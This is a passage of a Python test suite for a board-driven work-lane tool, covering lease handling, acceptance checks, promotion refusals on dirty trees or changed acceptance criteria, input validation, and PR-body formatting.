    world.items[(REPO, 7)]["status"] = "Ready"
    assert pull(world) == 0
    world.head = "d" * 40
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert world.items[(REPO, 7)]["iterations"] == 1.0


def test_promote_board_failure_keeps_lease_and_retries_the_bump(world, capsys):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    world.items[(REPO, 7)]["status"] = "Ready"
    assert pull(world) == 0
    world.head = "d" * 40
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    world.fail_writes = {"item-edit"}
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "board was not updated" in capsys.readouterr().err
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert card["promoted_sha"] != world.head and card["lease_expires"]
    assert card["pending_iterations"] == {"head": world.head, "value": 1}
    assert "factory-lease" in claim_markers(world)[-1]["body"]
    # The PR now shows the new head; the retry still applies the increment, once.
    world.fail_writes = set()
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert world.items[(REPO, 7)]["iterations"] == 1.0
    assert world.items[(REPO, 7)]["status"] == "QA"
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert "pending_iterations" not in card and card["lease_expires"] is None
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert world.items[(REPO, 7)]["iterations"] == 1.0


def test_check_that_changes_the_tree_cannot_be_promoted(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    world.on_accept = lambda w: setattr(w, "dirty", " M formatted.py\n")
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 1
    assert "changed the working tree" in capsys.readouterr().out
    result = json.loads((workdir(world) / ".factory" / "last_check.json").read_text())
    assert result["tree_changed"] is True and result["dirty"] is False
    world.dirty = ""
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert world.pushed == []


def test_promote_refuses_dirty_tree_now(world, capsys):
    pulled_and_checked(world)
    world.dirty = "?? new.py\n"
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "uncommitted" in capsys.readouterr().err and world.pushed == []


def test_promote_refuses_when_acceptance_changed(world, capsys):
    pulled_and_checked(world)
    world.items[(REPO, 7)]["acceptance"] = "`make test`"
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "Acceptance on the board changed" in capsys.readouterr().err
    assert world.pushed == []
    # Re-pulling picks up the new Acceptance and drops the old check.
    assert pull(world) == 0
    assert not (workdir(world) / ".factory" / "last_check.json").exists()


def test_building_card_with_stranger_marker_is_not_taken(world, capsys):
    world.add_card(7, status="Building", agent="someone")
    world.add_comment(REPO, 7, fl.lease_body("squatter", "x", T0 - timedelta(hours=1), "n"),
                      login="rando", association="NONE", at=T0 - timedelta(hours=2))
    assert pull(world) == 1
    assert "no lease" in capsys.readouterr().err
    assert world.items[(REPO, 7)]["agent"] == "someone"


def test_near_expiry_lease_is_not_renewed_in_place(world):
    world.add_card(7, status="Building")
    old = world.add_comment(REPO, 7, fl.lease_body("zion-coder-01", "laptop", T0 + timedelta(minutes=3), "n"),
                            at=T0 - timedelta(hours=4))
    assert pull(world) == 0
    markers = claim_markers(world)
    assert markers[-1]["id"] != old["id"] and old["body"].startswith("released:")


def test_claims_rank_by_last_write():
    class G:
        dry_run = False

        def json(self, args, **kw):
            mk = lambda cid, agent, created, updated: {  # noqa: E731
                "id": cid, "user": {"login": "kody-w"}, "author_association": "OWNER",
                "body": fl.lease_body(agent, "m", T0 + timedelta(hours=4), "n"),
                "created_at": fl.iso(created), "updated_at": fl.iso(updated)}
            return [[mk(1, "stale", T0 - timedelta(hours=4), T0 + timedelta(seconds=5)),
                     mk(2, "rival", T0, T0)]]

    claims = fl.read_claims(G(), REPO, 7)
    assert [c["agent"] for c in claims] == ["rival", "stale"]


def test_pull_next_takes_over_expired_building_card(world):
    world.add_card(1, status="Building")  # built outside the lane: no lease
    world.add_card(2, status="Building", agent="old")
    world.add_comment(REPO, 2, fl.lease_body("old", "desk", T0 - timedelta(minutes=1), "n"),
                      at=T0 - timedelta(hours=5))
    assert run(world, "pull", "--next", "--agent", "a1", "--machine", "m") == 0
    assert world.items[(REPO, 2)]["agent"] == "a1"
    assert claim_markers(world, 1) == []


def test_non_finite_numbers_are_refused(world, capsys):
    world.add_card(7)
    assert pull(world, 7, "zion-coder-01", "laptop", "--lease-hours", "nan") == 1
    assert "--lease-hours" in capsys.readouterr().err and gh_writes(world) == []
    assert pull(world) == 0
    for bad in ("nan", "-1", "inf"):
        assert run(world, "check", "--workdir", str(workdir(world)), "--yes", "--timeout", bad) == 1
    assert world.acceptance_calls == []


def test_commands_use_the_board_the_card_came_from(world, capsys):
    world.add_card(7)
    assert run(world, "--project", "kody-w/2", "pull", "--card", "rappterbook#7",
               "--agent", "zion-coder-01", "--machine", "laptop") == 0
    world.calls.clear()
    assert run(world, "release", "--workdir", str(workdir(world)), "--dry-run") == 0
    item_lists = [c["cmd"] for c in world.calls if c["cmd"][1:3] == ["project", "item-list"]]
    assert item_lists and all(cmd[3] == "2" for cmd in item_lists)
    assert run(world, "--project", "kody-w/1", "release", "--workdir", str(workdir(world))) == 1
    assert "pulled from the board kody-w/2" in capsys.readouterr().err
    assert world.items[(REPO, 7)]["status"] == "Building"


def test_pr_body_has_fix_line_with_safe_paths():
    card = {"number": 7, "acceptance": "", "machine": "m"}
    check = {"command": ["make"], "passed": True}
    body = fl.build_pr_body(card, "a1", check, ["scripts/x.py", "bad #3.py", "docs/`y`.md"])
    fix = [line for line in body.splitlines() if line.startswith("Fix:")]
    assert fix == ["Fix: built locally, changed `scripts/x.py` and 2 more"]
    assert "#3" not in body
    assert fl.fix_line([]) .startswith("Fix: built locally")
